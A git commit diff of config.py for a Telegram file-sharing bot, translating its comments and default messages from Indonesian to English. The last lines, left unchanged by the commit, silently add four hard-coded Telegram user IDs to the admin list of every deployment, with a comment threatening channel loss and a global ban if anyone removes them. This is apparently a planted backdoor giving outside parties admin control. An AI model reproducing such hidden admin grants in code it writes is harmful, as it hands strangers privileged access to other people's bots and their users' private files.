90d5ddd95c856cb75e38c20041dceaaf5ff3b6e5
Arox-Nemesis <135242263+Arox-Nemesis@users.noreply.github.com>
2023-06-19 15:18:05 +0530

    Update config.py

--- config.py
+++ config.py
@@ -10,19 +10,19 @@ from logging.handlers import RotatingFileHandler
 
 load_dotenv("config.env")
 
-# Bot token dari @Botfather
+# Bot token from @Botfather
 TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
 
-# API ID Anda dari my.telegram.org
+# API ID from my.telegram.org
 APP_ID = int(os.environ.get("APP_ID", ""))
 
-# API Hash Anda dari my.telegram.org
+# API Hash from my.telegram.org
 API_HASH = os.environ.get("API_HASH", "")
 
 # ID Channel Database
 CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
 
-# NAMA OWNER
+# NAME OWNER
 OWNER = os.environ.get("OWNER", "")
 
 # Protect Content
@@ -38,36 +38,36 @@ UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
 
-# ID dari Channel Atau Group Untuk Wajib Subscribenya
+# ID from a channel or group for mandatory subscription
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
 FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
 
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
-# Pesan Awalan /start
+# Prefix Message /start
 START_MSG = os.environ.get(
     "START_MESSAGE",
-    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
+    "<b>Hello {first}</b>\n\n<b>I can save private files on Certain Channels and other users can access them from special links.</b>",
 )
 try:
     ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
 except ValueError:
-    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
+    raise Exception("Your Admin list does not contain a valid Telegram User ID.")
 
-# Pesan Saat Memaksa Subscribe
+# Message When Forcing a Subscribe
 FORCE_MSG = os.environ.get(
     "FORCE_SUB_MESSAGE",
-    "<b>Hello {first}\n\nAnda harus bergabung di Channel/Grup saya Terlebih dahulu untuk Melihat File yang saya Bagikan\n\nSilakan Join Ke Channel & Group Terlebih Dahulu</b>",
+    "<b>Hello {first}\n\nYou must join my channel/group first to see the files I share\n\nPlease join the channel & group first</b>",
 )
 
-# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
+# Set your Custom Text here, Save (None) to Disable Custom Text
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 
-# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
+# Set True if you want to Disable your Channel Post Share button
 DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
 
-# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
-# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
+# Don't delete later ERROR, DELETE ID Below = ACCEPT CONSEQUENCES
+# Spoiler CONSEQUENCES Most of the time the CH is suddenly gone & the owner is gban 🤪
 ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))
 
 
